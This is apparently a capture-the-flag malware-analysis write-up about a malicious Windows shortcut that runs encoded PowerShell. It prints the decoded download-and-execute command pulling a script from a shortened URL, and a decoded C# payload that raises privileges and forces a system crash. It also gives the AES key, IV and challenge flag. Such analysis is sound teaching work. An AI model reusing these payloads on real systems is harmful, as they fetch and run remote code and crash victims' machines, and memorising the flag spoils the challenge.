My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :(

WARNING: Please examine this challenge inside of a virtual machine for your own security. Upon invocation there is a real possibility that your VM may crash.

NOTE: Archive password is russian_roulette

Download the file(s) below.

## Solution

Strings from the `.lnk` file can be read with `rabin2 -zzz` or `lnkinfo`.
It invokes powershell with the following argument: `-e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=`
Base64 decode the string: `iwr is.gd/jwr7JD -o $env:TMP/.cmd;& $env:TMP/.cmd`

Curl the url `is.gd/jwr7JD` as an obfuscated powershell script will be donwloaded. 

Look it up on any.run (MD5: `a07fcb39b340ad8dea993a5f5c4d9064`). There are several results, but only one of them seems to have detonated all the malicious behavior (the one where the submitted file hsa the `.bat` extension) -> https://app.any.run/tasks/b90ffbd5-f4c3-4368-8f72-001de9734226

Among all the dirty stuff and processes that are spawned, there is one powershell that get as argument a base64-encoded string. PID: 5584 (https://app.any.run/tasks/b90ffbd5-f4c3-4368-8f72-001de9734226?p=66ff60a5ec91b6d99a18aede). The launched powershell is:

```ps
powershell  -e JABzAD0AJwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkAOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ASQBPADsAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABYAHsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbgB0AGQAbABsAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAdQBpAG4AdAAgAFIAdABsAEEAZABqAHUAcwB0AFAAcgBpAHYAaQBsAGUAZwBlACgAaQBuAHQAIABwACwAYgBvAG8AbAAgAGUALABiAG8AbwBsACAAYwAsAG8AdQB0ACAAYgBvAG8AbAAgAG8AKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG4AdABkAGwAbAAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHUAaQBuAHQAIABOAHQAUgBhAGkAcwBlAEgAYQByAGQARQByAHIAbwByACgAdQBpAG4AdAAgAGUALAB1AGkAbgB0ACAAbgAsAHUAaQBuAHQAIAB1ACwASQBuAHQAUAB0AHIAIABwACwAdQBpAG4AdAAgAHYALABvAHUAdAAgAHUAaQBuAHQAIAByACkAOwBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdQBuAHMAYQBmAGUAIABzAHQAcgBpAG4AZwAgAFMAaABvAHQAKAApAHsAYgBvAG8AbAAgAG8AOwB1AGkAbgB0ACAAcgA7AFIAdABsAEEAZABqAHUAcwB0AFAAcgBpAHYAaQBsAGUAZwBlACgAMQA5ACwAdAByAHUAZQAsAGYAYQBsAHMAZQAsAG8AdQB0ACAAbwApADsATgB0AFIAYQBpAHMAZQBIAGEAcgBkAEUAcgByAG8AcgAoADAAeABjADAAMAAwADAAMAAyADIALAAwACwAMAAsAEkAbgB0AFAAdAByAC4AWgBlAHIAbwAsADYALABvAHUAdAAgAHIAKQA7AGIAeQB0AGUAWwBdAGMAPQBDAG8AbgB2AGUAcgB0AC4ARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIAUgBOAG8AOABUAFoANQA2AFIAdgArAEUAeQBaAFcANwAzAE4AbwBjAEYATwBJAGkATgBGAGYATAA0ADUAdABYAHcAMgA0AFUAbwBnAEcAZABIAGsAcwB3AGUAYQAvAFcAaABuAE4AaABDAE4AdwBqAFEAbgAxAGEAVwBqAGYAdwAiACkAOwBiAHkAdABlAFsAXQBrAD0AQwBvAG4AdgBlAHIAdAAuAEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAC8AYQAxAFkAKwBmAHMAcABxAC8ATgB3AGwAYwBQAHcAcABhAFQAMwBpAHIAWQAyAGgAYwBFAHkAdABrAHQAdQBIADcATABzAFkAKwBOAGwATABlAHcAPQAiACkAOwBiAHkAdABlAFsAXQBpAD0AQwBvAG4AdgBlAHIAdAAuAEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiADkAcwBYAEcAbQBLADQAcQA5AEwAZABZAEYAZABPAHAANABUAFMAcwBRAHcAPQA9ACIAKQA7AHUAcwBpAG4AZwAoAEEAZQBzACAAYQA9AEEAZQBzAC4AQwByAGUAYQB0AGUAKAApACkAewBhAC4ASwBlAHkAPQBrADsAYQAuAEkAVgA9AGkAOwBJAEMAcgB5AHAAdABvAFQAcgBhAG4AcwBmAG8AcgBtACAAZAA9AGEALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoAGEALgBLAGUAeQAsAGEALgBJAFYAKQA7AHUAcwBpAG4AZwAoAHYAYQByACAAbQA9AG4AZQB3ACAATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKABjACkAKQB1AHMAaQBuAGcAKAB2AGEAcgAgAHkAPQBuAGUAdwAgAEMAcgB5AHAAdABvAFMAdAByAGUAYQBtACgAbQAsAGQALABDAHIAeQBwAHQAbwBTAHQAcgBlAGEAbQBNAG8AZABlAC4AUgBlAGEAZAApACkAdQBzAGkAbgBnACgAdgBhAHIAIABzAD0AbgBlAHcAIABTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAHkAKQApAHsAcgBlAHQAdQByAG4AIABzAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAfQB9AH0AfQAnADsAJABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AQwBvAGQAZQBEAG8AbQAuAEMAbwBtAHAAaQBsAGUAcgAuAEMAbwBtAHAAaQBsAGUAcgBQAGEAcgBhAG0AZQB0AGUAcgBzADsAJABjAC4AQwBvAG0AcABpAGwAZQByAE8AcAB0AGkAbwBuAHMAPQAnAC8AdQBuAHMAYQBmAGUAJwA7ACQAYQA9AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzACAALQBMAGEAbgBnAHUAYQBnAGUAIABDAFMAaABhAHIAcAAgAC0AUABhAHMAcwBUAGgAcgB1ACAALQBDAG8AbQBwAGkAbABlAHIAUABhAHIAYQBtAGUAdABlAHIAcwAgACQAYwA7AGkAZgAoACgARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0ATQBpAG4AIAAxACAALQBNAGEAeAAgADcAKQAgAC0AZQBxACAAMQApAHsAWwBYAF0AOgA6AFMAaABvAHQAKAApAH0AUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACIA
```

Base64 decode it:

```ps
$s='using System;using System.Text;using System.Security.Cryptography;using System.Runtime.InteropServices;using System.IO;public class X{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r);public static unsafe string Shot(){bool o;uint r;RtlAdjustPrivilege(19,true,false,out o);NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r);byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");using(Aes a=Aes.Create()){a.Key=k;a.IV=i;ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV);using(var m=new MemoryStream(c))using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))using(var s=new StreamReader(y)){return s.ReadToEnd();}}}}';$c=New-Object System.CodeDom.Compiler.CompilerParameters;$c.CompilerOptions='/unsafe';$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c;if((Get-Random -Min 1 -Max 7) -eq 1){[X]::Shot()}Start-Process "powershell.exe"
```

It is aes-decrypting some stuff. I replicated the aes-decrypting process using cyberchef:

aes (default mode cbc)
K: /a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew= (key fromhex)
I: 9sXGmK4q9LdYFdOp4TSsQw== (IV fromhex)
C: RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw (ciphertext from base64, input as raw)

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'/a1Y%2Bfspq/NwlcPwpaT3irY2hcEytktuH7LsY%2BNlLew%3D'%7D,%7B'option':'Base64','string':'9sXGmK4q9LdYFdOp4TSsQw%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=Uk5vOFRaNTZSditFeVpXNzNOb2NGT0lpTkZmTDQ1dFh3MjRVb2dHZEhrc3dlYS9XaG5OaENOd2pRbjFhV2pmdwo

# Flag: flag{4e4f266d44717ff3af8bd92d292b79ec}

### Powershell command:

This PowerShell command consists of two parts separated by the `&` symbol (ampersand). Let's break it down:

**Part 1: Downloading a file**

* `iwr`: This is an alias for the `Invoke-WebRequest` cmdlet in PowerShell. It's used to download content from a web URL.
* `is.gd/jwr7JD`: This specifies the URL of the content you want to download. In this case, it points to a shortened link on the "is.gd" URL shortening service, leading to an unknown destination.
* `-o $env:TMP/.cmd`: This defines where the downloaded content will be saved. 
    * `-o`: This parameter specifies the output path for the downloaded content.
    * `$env:TMP`: This is an environment variable that refers to the temporary directory on your system. It's a common location to store temporary files. 
    * `/.cmd`: This creates a file with the extension ".cmd" in the temporary directory. The dot (.) at the beginning signifies a hidden file. 

**Part 2: Executing the downloaded file**

* `&`: This ampersand symbol is used as the "and" operator in PowerShell. However, in this context, it acts as a command separator. It tells PowerShell to execute the second part of the command after the first part finishes.
* `$env:TMP/.cmd`: This refers to the downloaded file path you specified in part 1. Since the file now exists, PowerShell attempts to execute it.

**Overall functionality:**

This command downloads a file from the specified URL, likely containing script content, and then immediately executes it from the temporary directory. 

**Security concerns:**

It's important to be cautious with this type of command. Downloading and executing unknown scripts poses a significant security risk. The script could potentially harm your system, steal data, or install malware.  

Here are some safer approaches:

* **Review the script content**: Before executing any downloaded script, examine its contents to understand what it does.  
* **Use a dedicated download location**: Downloading to a location outside the temporary directory allows for better management and potential quarantining before execution.
* **Consider alternative tools**: For downloading files, consider using tools designed for safe downloads, like web browsers or dedicated download managers. 